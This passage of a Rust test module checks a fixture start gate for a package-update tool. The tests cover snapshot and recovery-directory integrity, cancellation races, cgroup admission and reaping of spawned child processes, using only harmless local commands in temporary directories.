                        .stderr(Stdio::null())
                        .spawn()
                })
                .unwrap();
            if add_lock {
                std::fs::write(&lock, b"unexpected").unwrap();
            } else {
                std::fs::write(&manifest, b"changed").unwrap();
            }
            assert!(matches!(
                gate.record_same_user_child(child.child.as_mut().unwrap()),
                Err("fixture recovery unavailable")
            ));
            assert!(!state.join("pending-child").exists());
            if add_lock {
                std::fs::remove_file(&lock).unwrap();
            } else {
                std::fs::write(&manifest, b"original").unwrap();
            }
            assert!(matches!(
                gate.record_same_user_child(child.child.as_mut().unwrap()),
                Err("fixture recovery unavailable")
            ));
            assert_eq!(
                child
                    .reject_with_cleanup("fixture recovery unavailable", stop_fixture_direct_child),
                "fixture recovery unavailable"
            );
            assert!(child.child.is_none());
            assert_eq!(std::fs::read(state.join("pending-intent")).unwrap(), intent);
            assert_eq!(
                std::fs::read(state.join("pending-snapshot")).unwrap(),
                snapshot
            );
            assert!(!state.join("pending-child").exists());
            let inspection = crate::same_user_supervisor::inspect_recovery(&state);
            assert_eq!(
                inspection.descendant_cleanup,
                crate::same_user_supervisor::RecoveryOutcome::Unknown
            );
            assert_eq!(
                inspection.rollback,
                crate::same_user_supervisor::RecoveryOutcome::Unknown
            );
        }
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn synthetic_gate_refuses_replaced_recovery_directory() {
        use std::os::unix::fs::PermissionsExt;
        use std::process::{Command, Stdio};
        for after_spawn in [false, true] {
            let root = tempfile::tempdir().unwrap();
            std::fs::set_permissions(root.path(), std::fs::Permissions::from_mode(0o700)).unwrap();
            crate::recovery_state::provision_state_directory(
                root.path(),
                std::ffi::OsStr::new("state"),
            )
            .unwrap();
            let state = root.path().join("state");
            let moved = root.path().join("moved-state");
            let source = tempfile::tempdir_in(root.path()).unwrap();
            std::fs::write(source.path().join("Cargo.toml"), b"original").unwrap();
            let directory =
                crate::recovery_state::open_provisioned_state_directory(&state).unwrap();
            let gate = FixtureStartGate::with_synthetic_recovery_plan(
                directory,
                source,
                b"modified".to_vec(),
            );
            gate.begin_fixture_start().unwrap();
            let mut child = if after_spawn {
                Some(
                    gate.start_fixture_child(|| {
                        Command::new("/bin/sh")
                            .args(["-c", "IFS= read -r line"])
                            .env_clear()
                            .stdin(Stdio::piped())
                            .stdout(Stdio::null())
                            .stderr(Stdio::null())
                            .spawn()
                    })
                    .unwrap(),
                )
            } else {
                None
            };
            std::fs::rename(&state, &moved).unwrap();
            crate::recovery_state::provision_state_directory(
                root.path(),
                std::ffi::OsStr::new("state"),
            )
            .unwrap();
            let original_intent = std::fs::read(moved.join("pending-intent")).unwrap();
            if let Some(child) = child.as_mut() {
                assert!(matches!(
                    gate.record_same_user_child(child.child.as_mut().unwrap()),
                    Err("fixture recovery unavailable")
                ));
                assert_eq!(
                    child.reject_with_cleanup(
                        "fixture recovery unavailable",
                        stop_fixture_direct_child
                    ),
                    "fixture recovery unavailable"
                );
                assert!(child.child.is_none());
            } else {
                assert!(matches!(
                    gate.start_fixture_child(|| -> std::io::Result<std::process::Child> {
                        panic!("replaced recovery directory must prevent spawn")
                    }),
                    Err("fixture recovery unavailable")
                ));
            }
            assert_eq!(
                std::fs::read(moved.join("pending-intent")).unwrap(),
                original_intent
            );
            assert!(!moved.join("pending-child").exists());
            assert!(!state.join("pending-intent").exists());
            assert!(!state.join("pending-child").exists());
            let inspection = crate::same_user_supervisor::inspect_recovery(&moved);
            assert_eq!(
                inspection.descendant_cleanup,
                crate::same_user_supervisor::RecoveryOutcome::Unknown
            );
            assert_eq!(
                inspection.rollback,
                crate::same_user_supervisor::RecoveryOutcome::Unknown
            );
        }
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn same_user_gate_refuses_changed_snapshot_after_begin() {
        use sha2::{Digest, Sha256};
        use std::os::unix::fs::PermissionsExt;
        for replace_with_valid in [false, true] {
            let root = tempfile::tempdir().unwrap();
            std::fs::set_permissions(root.path(), std::fs::Permissions::from_mode(0o700)).unwrap();
            crate::recovery_state::provision_state_directory(
                root.path(),
                std::ffi::OsStr::new("state"),
            )
            .unwrap();
            let state = root.path().join("state");
            let directory =
                crate::recovery_state::open_provisioned_state_directory(&state).unwrap();
            let gate = FixtureStartGate::with_same_user_snapshot(
                directory,
                crate::same_user_supervisor::SyntheticFileSnapshot {
                    version: 1,
                    cargo_toml: Some(b"before".to_vec()),
                    cargo_lock: None,
                },
            );
            gate.begin_fixture_start().unwrap();
            let path = state.join("pending-snapshot");
            let mut record = std::fs::read(&path).unwrap();
            if replace_with_valid {
                let replacement =
                    serde_json::to_vec(&crate::same_user_supervisor::SyntheticFileSnapshot {
                        version: 1,
                        cargo_toml: Some(b"different".to_vec()),
                        cargo_lock: None,
                    })
                    .unwrap();
                record.truncate(80);
                record[40..48].copy_from_slice(&(replacement.len() as u64).to_be_bytes());
                record[48..80].copy_from_slice(&Sha256::digest(&replacement));
                record.extend_from_slice(&replacement);
            } else {
                *record.last_mut().unwrap() ^= 1;
            }
            std::fs::write(&path, &record).unwrap();
            let spawn = || -> std::io::Result<std::process::Child> {
                panic!("changed snapshot must prevent spawn")
            };
            assert!(matches!(
                gate.start_fixture_child(spawn),
                Err("fixture recovery unavailable")
            ));
            assert!(matches!(
                gate.start_fixture_child(spawn),
                Err("fixture startup not begun")
            ));
            assert_eq!(std::fs::read(&path).unwrap(), record);
            assert!(state.join("pending-intent").exists());
            assert!(!state.join("pending-child").exists());
            let inspection = crate::same_user_supervisor::inspect_recovery(&state);
            assert_eq!(
                inspection.rollback,
                crate::same_user_supervisor::RecoveryOutcome::Unknown
            );
            assert_eq!(
                inspection.descendant_cleanup,
                crate::same_user_supervisor::RecoveryOutcome::Unknown
            );
        }
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn same_user_gate_refuses_snapshot_corrupted_before_release() {
        use std::os::unix::fs::PermissionsExt;
        use std::process::{Command, Stdio};
        let root = tempfile::tempdir().unwrap();
        std::fs::set_permissions(root.path(), std::fs::Permissions::from_mode(0o700)).unwrap();
        crate::recovery_state::provision_state_directory(
            root.path(),
            std::ffi::OsStr::new("state"),
        )
        .unwrap();
        let state = root.path().join("state");
        let directory = crate::recovery_state::open_provisioned_state_directory(&state).unwrap();
        let gate = FixtureStartGate::with_same_user_snapshot(
            directory,
            crate::same_user_supervisor::SyntheticFileSnapshot {
                version: 1,
                cargo_toml: Some(b"synthetic".to_vec()),
                cargo_lock: None,
            },
        );
        gate.begin_fixture_start().unwrap();
        let mut spawned = gate
            .start_fixture_child(|| {
                Command::new("/bin/sh")
                    .args(["-c", "IFS= read -r line"])
                    .env_clear()
                    .stdin(Stdio::piped())
                    .stdout(Stdio::null())
                    .stderr(Stdio::null())
                    .spawn()
            })
            .unwrap();
        gate.record_same_user_child(spawned.child.as_mut().unwrap())
            .unwrap();
        gate.attach_synthetic_kill(tempfile::tempfile_in(root.path()).unwrap())
            .unwrap();
        let path = state.join("pending-snapshot");
        let original = std::fs::read(&path).unwrap();
        let mut corrupt = original.clone();
        *corrupt.last_mut().unwrap() ^= 1;
        std::fs::write(&path, &corrupt).unwrap();
        let mut released = Vec::new();
        assert_eq!(
            gate.release(&mut released),
            Err("fixture recovery unavailable")
        );
        assert!(released.is_empty());
        // Restoring this test-only fixture does not reset the terminal gate.
        std::fs::write(&path, original).unwrap();
        assert_eq!(
            gate.release(&mut released),
            Err("fixture recovery unavailable")
        );
        assert!(released.is_empty());
        assert!(state.join("pending-intent").exists());
        assert!(state.join("pending-child").exists());
        let inspection = crate::same_user_supervisor::inspect_recovery(&state);
        assert_eq!(
            inspection.descendant_cleanup,
            crate::same_user_supervisor::RecoveryOutcome::Unknown
        );
        assert_eq!(
            inspection.rollback,
            crate::same_user_supervisor::RecoveryOutcome::Unknown
        );
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn same_user_gate_refuses_snapshot_corrupted_before_child_binding() {
        use std::os::unix::fs::PermissionsExt;
        use std::process::{Command, Stdio};
        let root = tempfile::tempdir().unwrap();
        std::fs::set_permissions(root.path(), std::fs::Permissions::from_mode(0o700)).unwrap();
        crate::recovery_state::provision_state_directory(
            root.path(),
            std::ffi::OsStr::new("state"),
        )
        .unwrap();
        let state = root.path().join("state");
        let directory = crate::recovery_state::open_provisioned_state_directory(&state).unwrap();
        let gate = FixtureStartGate::with_same_user_snapshot(
            directory,
            crate::same_user_supervisor::SyntheticFileSnapshot {
                version: 1,
                cargo_toml: Some(b"synthetic".to_vec()),
                cargo_lock: None,
            },
        );
        gate.begin_fixture_start().unwrap();
        let mut spawned = gate
            .start_fixture_child(|| {
                Command::new("/bin/sh")
                    .args(["-c", "IFS= read -r line"])
                    .env_clear()
                    .stdin(Stdio::piped())
                    .stdout(Stdio::null())
                    .stderr(Stdio::null())
                    .spawn()
            })
            .unwrap();
        let path = state.join("pending-snapshot");
        let original = std::fs::read(&path).unwrap();
        let mut corrupt = original.clone();
        *corrupt.last_mut().unwrap() ^= 1;
        std::fs::write(&path, &corrupt).unwrap();
        assert!(matches!(
            gate.record_same_user_child(spawned.child.as_mut().unwrap()),
            Err("fixture recovery unavailable")
        ));
        assert!(spawned
            .child
            .as_mut()
            .unwrap()
            .try_wait()
            .unwrap()
            .is_none());
        assert!(!state.join("pending-child").exists());
        std::fs::write(&path, original).unwrap();
        assert!(matches!(
            gate.record_same_user_child(spawned.child.as_mut().unwrap()),
            Err("fixture recovery unavailable")
        ));
        assert_eq!(
            spawned.reject_with_cleanup("fixture recovery unavailable", stop_fixture_direct_child),
            "fixture recovery unavailable"
        );
        assert!(spawned.child.is_none());
        assert!(state.join("pending-intent").exists());
        assert_eq!(
            crate::same_user_supervisor::inspect_recovery(&state).descendant_cleanup,
            crate::same_user_supervisor::RecoveryOutcome::Unknown
        );
        assert_eq!(
            crate::same_user_supervisor::inspect_recovery(&state).rollback,
            crate::same_user_supervisor::RecoveryOutcome::Unknown
        );
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn fixture_close_range_error_prevents_exec_and_reports_error() {
        let directory = tempfile::tempdir().unwrap();
        let marker = directory.path().join("executed");
        let mut command = std::process::Command::new("/usr/bin/touch");
        command.arg(&marker);
        fixture_close_extra_descriptors_with_flags(&mut command, u32::MAX);
        assert!(command.spawn().is_err());
        assert!(!marker.exists());
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn fixture_close_range_preserves_exec_failure_reporting() {
        let mut command = std::process::Command::new("/nonexistent-tucupi-fixture-executable");
        fixture_close_extra_descriptors_on_exec(&mut command);
        assert_eq!(
            command.spawn().unwrap_err().kind(),
            std::io::ErrorKind::NotFound
        );
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn late_child_cleanup_failure_keeps_guard_for_retry() {
        let gate = FixtureStartGate::default();
        gate.begin_fixture_start().unwrap();
        let pid = std::cell::Cell::new(0);
        let result = gate.start_fixture_child_using(
            || {
                let child = std::process::Command::new("/usr/bin/sleep")
                    .arg("30")
                    .spawn()?;
                pid.set(child.id());
                gate.cancel().unwrap();
                Ok(child)
            },
            |_| false,
        );
        assert!(matches!(result, Err("fixture child cleanup unverified")));
        assert_ne!(pid.get(), 0);
        assert!(!std::path::Path::new(&format!("/proc/{}", pid.get())).exists());
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn admission_rejection_does_not_hide_failed_group_cancellation() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("cgroup.events"), "populated 1\n").unwrap();
        let observation = crate::codex_supervision::CgroupObservation::open(dir.path()).unwrap();
        let sequence = crate::codex_supervision::CgroupSequence::new(observation);
        let attempt = FixtureReviewAttempt::start(sequence).unwrap();
        let child = std::process::Command::new("/usr/bin/sleep")
            .arg("30")
            .spawn()
            .unwrap();
        let mut supervised = FixtureSupervisedChild {
            attempt,
            child,
            reaped: false,
            recovery_exit: None,
        };
        let error = supervised.reject_after_admission("fixture gate release failed");
        assert_eq!(error, "fixture cleanup unverified");
        assert!(supervised.reaped);
        assert!(supervised.child.try_wait().unwrap().is_some());
        assert!(supervised.attempt.observe().is_err());
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn admission_rejection_reports_unverified_child_cleanup() {
        let gate = FixtureStartGate::default();
        gate.begin_fixture_start().unwrap();
        let mut spawned = gate
            .start_fixture_child(|| {
                std::process::Command::new("/usr/bin/sleep")
                    .arg("30")
                    .spawn()
            })
            .unwrap();
        let pid = spawned.child.as_ref().unwrap().id();
        let error = spawned.reject_with_cleanup("synthetic admission error", |_| false);
        assert_eq!(error, "fixture child cleanup unverified");
        assert!(spawned.child.is_some());
        drop(spawned);
        assert!(!std::path::Path::new(&format!("/proc/{pid}")).exists());
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn admission_panic_keeps_guard_until_child_is_reaped() {
        let dir = tempfile::tempdir().unwrap();
        let observation = crate::codex_supervision::CgroupObservation::open(dir.path()).unwrap();
        let gate = FixtureStartGate::default();
        gate.begin_fixture_start().unwrap();
        gate.admission_panic
            .store(true, std::sync::atomic::Ordering::SeqCst);
        let spawned = gate
            .start_fixture_child(|| {
                std::process::Command::new("/usr/bin/sleep")
                    .arg("30")
                    .stdin(std::process::Stdio::piped())
                    .spawn()
            })
            .unwrap();
        let pid = spawned.child.as_ref().unwrap().id();
        let result = std::panic::catch_unwind(|| {
            FixtureSupervisedChild::admit_and_release(observation, spawned, || Ok(()))
        });
        assert!(result.is_err());
        assert!(!std::path::Path::new(&format!("/proc/{pid}")).exists());
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn dropping_spawn_guard_reaps_synthetic_child_before_admission() {
        let gate = FixtureStartGate::default();
        gate.begin_fixture_start().unwrap();
        let spawned = gate
            .start_fixture_child(|| {
                std::process::Command::new("/usr/bin/sleep")
                    .arg("30")
                    .spawn()
            })
            .unwrap();
        let pid = spawned.child.as_ref().unwrap().id();
        assert!(std::path::Path::new(&format!("/proc/{pid}")).exists());
        drop(spawned);
        assert!(!std::path::Path::new(&format!("/proc/{pid}")).exists());
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn fixture_spawned_child_retains_its_own_attempt_gate() {
        let first = FixtureStartGate::default();
        let other = FixtureStartGate::default();
        first.begin_fixture_start().unwrap();
        other.begin_fixture_start().unwrap();
        let mut spawned = first
            .start_fixture_child(|| {
                std::process::Command::new("/usr/bin/sleep")
                    .arg("30")
                    .spawn()
            })
            .unwrap();
        other.cancel().unwrap();
        let bound_to_first = std::ptr::eq(spawned.gate, &first);
        let first_cancelled = spawned.gate.is_cancelled();
        let reaped = stop_fixture_direct_child(spawned.child.as_mut().unwrap());
        assert!(reaped);
        assert!(bound_to_first);
        assert!(!first_cancelled);
        assert!(other.is_cancelled());
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn fixture_release_requires_admission_and_is_single_use_even_on_write_failure() {
        let gate = FixtureStartGate::default();
        let mut output = Vec::new();
        assert_eq!(gate.release(&mut output), Err("fixture child not admitted"));
        gate.begin_fixture_start().unwrap();
        let mut child = gate
            .start_fixture_child(|| {
                std::process::Command::new("/usr/bin/sleep")
                    .arg("30")
                    .spawn()
            })
            .unwrap();
        let before_attach = gate.release(&mut output);
        let sink = std::fs::OpenOptions::new()
            .write(true)
            .open("/dev/null")
            .unwrap();
        gate.attach_synthetic_kill(sink).unwrap();
        let mut full = std::fs::OpenOptions::new()
            .write(true)
            .open("/dev/full")
            .unwrap();
        let failed_write = gate.release(&mut full);
        let repeated = gate.release(&mut output);
        let reaped = stop_fixture_direct_child(child.child.as_mut().unwrap());
        assert!(reaped);
        assert_eq!(before_attach, Err("fixture child not admitted"));
        assert_eq!(failed_write, Err("fixture gate release failed"));
        assert_eq!(repeated, Err("fixture gate already released"));
        assert!(output.is_empty());
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn fixture_cancel_before_spawn_prevents_start_and_duplicate_attempts() {
        let gate = FixtureStartGate::default();
        gate.begin_fixture_start().unwrap();
        gate.cancel().unwrap();
        let ran = std::cell::Cell::new(false);
        let result = gate.start_fixture_child(|| {
            ran.set(true);
            Err(std::io::Error::other("must not start"))
        });
        assert!(matches!(result, Err("fixture startup cancelled")));
        assert!(!ran.get());

        let other = FixtureStartGate::default();
        other.begin_fixture_start().unwrap();
        assert!(matches!(
            other.start_fixture_child(|| Err(std::io::Error::other("synthetic"))),
            Err("fixture child unavailable")
        ));
        assert!(matches!(
            other.start_fixture_child(|| Err(std::io::Error::other("must not start"))),
            Err("fixture child start already attempted")
        ));
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn fixture_cancel_during_spawn_stops_late_child_without_blocking() {
        let gate = std::sync::Arc::new(FixtureStartGate::default());
        gate.begin_fixture_start().unwrap();
        let (entered_tx, entered_rx) = std::sync::mpsc::channel();
        let (resume_tx, resume_rx) = std::sync::mpsc::channel();
        let worker_gate = gate.clone();
        let worker = std::thread::spawn(move || {
            let result = worker_gate.start_fixture_child(|| {
                let child = std::process::Command::new("/usr/bin/sleep")
                    .arg("30")
                    .spawn()?;
                entered_tx.send(child.id()).unwrap();
                resume_rx.recv_timeout(Duration::from_secs(2)).unwrap();
                Ok(child)
            });
            matches!(result, Err("fixture startup cancelled"))
        });
        let pid = entered_rx.recv_timeout(Duration::from_secs(2)).unwrap();
        let cancel_gate = gate.clone();
        let (cancel_tx, cancel_rx) = std::sync::mpsc::channel();
        let canceller =
            std::thread::spawn(move || cancel_tx.send(cancel_gate.cancel_with_unit()).unwrap());
        let cancelled = cancel_rx.recv_timeout(Duration::from_secs(1));
        resume_tx.send(()).unwrap();
        canceller.join().unwrap();
        assert_eq!(cancelled.unwrap(), Ok(true));
        assert!(worker.join().unwrap());
        assert!(!std::path::Path::new(&format!("/proc/{pid}")).exists());
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn failed_child_wait_requests_stop_and_never_reports_clean_group() {
        let mut child = std::process::Command::new("/usr/bin/sleep")
            .arg("30")
            .spawn()
            .unwrap();
        let mut reaped = false;
        let deadline = std::time::Instant::now() + Duration::from_secs(2);
        let result = wait_for_fixture_child_after_cancel(&mut child, &mut reaped, deadline, |_| {
            Err(std::io::Error::other("synthetic wait failure"))
        });
        assert_eq!(result, Err("fixture child wait failed"));
        assert!(reaped);
        assert!(child.try_wait().unwrap().is_some());
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn expired_child_wait_requests_stop_without_claiming_reaping() {
        use std::os::unix::process::ExitStatusExt;
        let mut child = std::process::Command::new("/usr/bin/sleep")
            .arg("30")
            .spawn()
            .unwrap();
        let mut reaped = false;
        let result = wait_for_fixture_child_after_cancel(
            &mut child,
            &mut reaped,
            std::time::Instant::now(),
            |_| Ok(None),
        );
        assert_eq!(result, Err("fixture child cancellation timed out"));
        assert!(!reaped);
        assert_eq!(child.wait().unwrap().signal(), Some(9));
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn failed_group_cancellation_reaps_direct_child_before_owner_drop() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("cgroup.events"), "populated 1\n").unwrap();
        let observation = crate::codex_supervision::CgroupObservation::open(dir.path()).unwrap();
        let sequence = crate::codex_supervision::CgroupSequence::new(observation);
        let attempt = FixtureReviewAttempt::start(sequence).unwrap();
        let child = std::process::Command::new("/usr/bin/sleep")
            .arg("30")
            .spawn()
            .unwrap();
        let mut supervised = FixtureSupervisedChild {
            attempt,
            child,
            reaped: false,
            recovery_exit: None,
        };

        // An unrelated synthetic directory cannot provide a fixture kill handle.
        assert!(supervised
            .cancel_and_observe(Duration::from_secs(2))
            .is_err());
        assert!(supervised.reaped);
        assert!(supervised.child.try_wait().unwrap().is_some());
        assert!(supervised.attempt.observe().is_err());
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn broken_gate_poll_error_stops_and_reaps_direct_child() {
        let dir = tempfile::tempdir().unwrap();
        let mut child = std::process::Command::new("/usr/bin/sleep")
            .arg("30")
            .spawn()
            .unwrap();
        let pid = child.id();
        let result = wait_for_broken_fixture_gate(&mut child, &dir.path().join("missing"), |_| {
            Err(std::io::Error::other("synthetic poll failure"))
        });
        assert_eq!(result, Err("broken gate fixture unavailable"));
        assert!(child.try_wait().unwrap().is_some());
        assert!(!std::path::Path::new(&format!("/proc/{pid}")).exists());
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn fixture_attachment_racing_cancel_preserves_stop_request() {
        for _ in 0..32 {
            let dir = tempfile::tempdir().unwrap();
            let path = dir.path().join("synthetic-cancel");
            let file = std::fs::File::create(&path).unwrap();
            let gate = std::sync::Arc::new(FixtureStartGate::default());
            gate.begin_fixture_start().unwrap();
            let barrier = std::sync::Arc::new(std::sync::Barrier::new(2));
            let worker_gate = gate.clone();
            let worker_barrier = barrier.clone();
            let worker = std::thread::spawn(move || {
                worker_barrier.wait();
                worker_gate.attach_synthetic_kill(file)
            });
            barrier.wait();
            assert_eq!(gate.cancel_with_unit(), Ok(true));
            let attached = worker.join().unwrap();
            let written = std::fs::read(&path).unwrap();
            match attached {
                Ok(()) => assert_eq!(written, b"1"),
                Err(error) => {
                    assert_eq!(error, "fixture startup cancelled");
                    assert!(written.is_empty());
                }
            }
            assert!(gate.release(&mut Vec::new()).is_err());
        }
    }

    #[test]
    fn cancellation_before_cache_acceptance_rejects_cached_safe_review() {
        let control = FixtureStartGate::default();
        let mut config = Config::default();
        config.security.review_provider = Some("apple".into());
        let cached = ReviewReport {
            verdict: ReviewVerdict::Safe,
            reason: "synthetic cached review".into(),
            view_mode: ReviewViewMode::Diff,
            residual_line_count: 0,
            hits: Vec::new(),
            origin: ReviewOrigin::Unknown,
        };
        assert_eq!(
            accept_cached_review(cached.clone(), &config, &control).verdict,
            ReviewVerdict::Safe
        );
        // This represents cancellation after the cache returned but before its
        // result is accepted; no model or package command is executed.
        control.cancel().unwrap();
        let result = accept_cached_review(cached, &config, &control);
        assert_eq!(result.verdict, ReviewVerdict::Review);
        assert_eq!(result.reason, "source review cancelled");
        assert_eq!(result.view_mode, ReviewViewMode::Unavailable);
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn fixture_gate_rejects_attachment_before_startup() {
        let gate = FixtureStartGate::default();
        let sink = std::fs::OpenOptions::new()
            .write(true)
            .open("/dev/null")
            .unwrap();
        assert_eq!(
            gate.attach_synthetic_kill(sink),
            Err("fixture startup not begun")
        );
        assert_eq!(gate.cancel_with_unit(), Ok(false));
        assert_eq!(gate.begin_fixture_start(), Err("fixture startup cancelled"));
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn fixture_startup_and_cancel_have_consistent_order() {
        let gate = std::sync::Arc::new(FixtureStartGate::default());
        let barrier = std::sync::Arc::new(std::sync::Barrier::new(2));
        let worker_gate = gate.clone();
        let worker_barrier = barrier.clone();
        let worker = std::thread::spawn(move || {
            worker_barrier.wait();
            worker_gate.begin_fixture_start()
        });
        barrier.wait();
        let cancellation = gate.cancel_with_unit().unwrap();
        match worker.join().unwrap() {
            Ok(()) => assert!(cancellation),
            Err(error) => {
                assert_eq!(error, "fixture startup cancelled");
                assert!(!cancellation);
            }
        }
    }

    #[tokio::test]
    async fn cancelled_attempt_does_not_begin_package_review() {
        let control = FixtureStartGate::default();
        control.cancel().unwrap();
        let dep = Dependency {
            name: "synthetic".into(),
            current_version: "1".into(),
            latest_version: "2".into(),
            ecosystem: Ecosystem::Homebrew,
            is_global: true,
            origin: None,
        };
        let result = review_package_with_control(&dep, &Config::default(), &control).await;
        assert_eq!(result.verdict, ReviewVerdict::Review);
        assert_eq!(result.reason, "source review cancelled");
        assert_eq!(result.view_mode, ReviewViewMode::Unavailable);
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn fixture_gate_rejects_rebinding_and_keeps_original_handle() {
        let dir = tempfile::tempdir().unwrap();
        let original_path = dir.path().join("synthetic-cancel");
        let original = std::fs::File::create(&original_path).unwrap();
        let replacement = std::fs::OpenOptions::new()
            .write(true)
            .open("/dev/full")
            .unwrap();
        let gate = FixtureStartGate::default();
        gate.begin_fixture_start().unwrap();
        gate.attach_synthetic_kill(original).unwrap();
        assert_eq!(
            gate.attach_synthetic_kill(replacement),
            Err("fixture unit already attached")
        );
        assert_eq!(gate.cancel_with_unit(), Ok(true));
        assert_eq!(std::fs::read(&original_path).unwrap(), b"1");
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn fixture_gate_allows_only_one_concurrent_attachment() {
        let dir = tempfile::tempdir().unwrap();
        let paths = [dir.path().join("first"), dir.path().join("second")];
        let gate = std::sync::Arc::new(FixtureStartGate::default());
        gate.begin_fixture_start().unwrap();
        let barrier = std::sync::Arc::new(std::sync::Barrier::new(2));
        let mut workers = Vec::new();
        for path in &paths {
            let file = std::fs::File::create(path).unwrap();
            let gate = gate.clone();
            let barrier = barrier.clone();
            workers.push(std::thread::spawn(move || {
                barrier.wait();
                gate.attach_synthetic_kill(file)
            }));
        }
        let results: Vec<_> = workers
            .into_iter()
            .map(|worker| worker.join().unwrap())
            .collect();
        assert_eq!(results.iter().filter(|result| result.is_ok()).count(), 1);
        assert_eq!(
            results
                .iter()
                .filter(|result| **result == Err("fixture unit already attached"))
                .count(),
            1
        );
        assert_eq!(gate.cancel_with_unit(), Ok(true));
        let contents: Vec<_> = paths
            .iter()
            .map(|path| std::fs::read(path).unwrap())
            .collect();
        assert_eq!(
            contents
                .iter()
                .filter(|content| content.as_slice() == b"1")
                .count(),
            1
        );
        assert_eq!(
            contents.iter().filter(|content| content.is_empty()).count(),
            1
        );
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn fixture_supervised_child_never_releases_gate_after_failed_admission() {
        let dir = tempfile::tempdir().unwrap();
        let marker = dir.path().join("released");
        let procs = dir.path().join("cgroup.procs");
        std::fs::write(&procs, "untouched").unwrap();
        let gate = FixtureStartGate::default();
        gate.begin_fixture_start().unwrap();
        let child = gate.start_fixture_child(|| std::process::Command::new("/usr/bin/python3")
            .args(["-c", "import pathlib,sys; b=sys.stdin.buffer.read(1); b == b'1' and pathlib.Path(sys.argv[1]).touch()"])
            .arg(&marker)
            .stdin(std::process::Stdio::piped())
            .spawn()).unwrap();
        let observation = crate::codex_supervision::CgroupObservation::open(dir.path()).unwrap();
        assert!(FixtureSupervisedChild::admit_and_release(observation, child, || Ok(())).is_err());
        assert!(!marker.exists());
        assert_eq!(std::fs::read_to_string(procs).unwrap(), "untouched");
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn persistent_fixture_refuses_admission_without_delegated_cgroup() {
        use std::os::unix::fs::PermissionsExt;
        use std::process::{Command, Stdio};
        let parent = std::env::var_os("TUCUPI_ADMISSION_REOPEN_ROOT");
        let mut root = match &parent {
            Some(parent) => tempfile::tempdir_in(parent).unwrap(),
            None => tempfile::tempdir().unwrap(),
        };
        if let Some(parent) = &parent {
            std::fs::write(
                std::path::Path::new(parent).join("fixture-location"),
                root.path().as_os_str().as_encoded_bytes(),
            )
            .unwrap();
            // The parent test owns and removes the enclosing disposable tree.
            root.disable_cleanup(true);
        }
        std::fs::set_permissions(root.path(), std::fs::Permissions::from_mode(0o700)).unwrap();
        crate::recovery_state::provision_state_directory(
            root.path(),
            std::ffi::OsStr::new("state"),
        )
        .unwrap();
        let state = root.path().join("state");
        let source = tempfile::tempdir_in(root.path()).unwrap();
        let manifest = source.path().join("Cargo.toml");
        std::fs::write(&manifest, b"synthetic original").unwrap();
        let marker = root.path().join("released");
        let gate = FixtureStartGate::with_synthetic_recovery_plan(
            crate::recovery_state::open_provisioned_state_directory(&state).unwrap(),
            source,
            b"synthetic modified".to_vec(),
        );
        gate.begin_fixture_start().unwrap();
        let intent = std::fs::read(state.join("pending-intent")).unwrap();
        let snapshot = std::fs::read(state.join("pending-snapshot")).unwrap();
        let postimage = std::fs::read(state.join("pending-fixture-postimage")).unwrap();
        let group = root.path().join("fake-group");
        std::fs::create_dir(&group).unwrap();
        std::fs::write(group.join("cgroup.procs"), b"untouched").unwrap();
        std::fs::write(group.join("cgroup.events"), b"populated 1\n").unwrap();
        let spawned = gate
            .start_fixture_child(|| {
                Command::new("/bin/sh")
                    .args([
                        "-c",
                        "IFS= read -r line; [ \"$line\" = 1 ] && printf released > \"$1\"",
                        "fixture",
                    ])
                    .arg(&marker)
                    .env_clear()
                    .stdin(Stdio::piped())
                    .stdout(Stdio::null())
                    .stderr(Stdio::null())
                    .spawn()
            })
            .unwrap();
        let pid = spawned.child.as_ref().unwrap().id();
        let observation = crate::codex_supervision::CgroupObservation::open(&group).unwrap();
        assert!(
            FixtureSupervisedChild::admit_and_release(observation, spawned, || Ok(())).is_err()
        );
        assert!(!std::path::Path::new(&format!("/proc/{pid}")).exists());
        assert!(!marker.exists());
        assert_eq!(std::fs::read(&manifest).unwrap(), b"synthetic original");
        assert_eq!(
            std::fs::read(group.join("cgroup.procs")).unwrap(),
            b"untouched"
        );
        assert_eq!(std::fs::read(state.join("pending-intent")).unwrap(), intent);
        assert_eq!(
            std::fs::read(state.join("pending-snapshot")).unwrap(),
            snapshot
        );
        assert_eq!(
            std::fs::read(state.join("pending-fixture-postimage")).unwrap(),
            postimage
        );
        assert!(!state.join("pending-exit").exists());
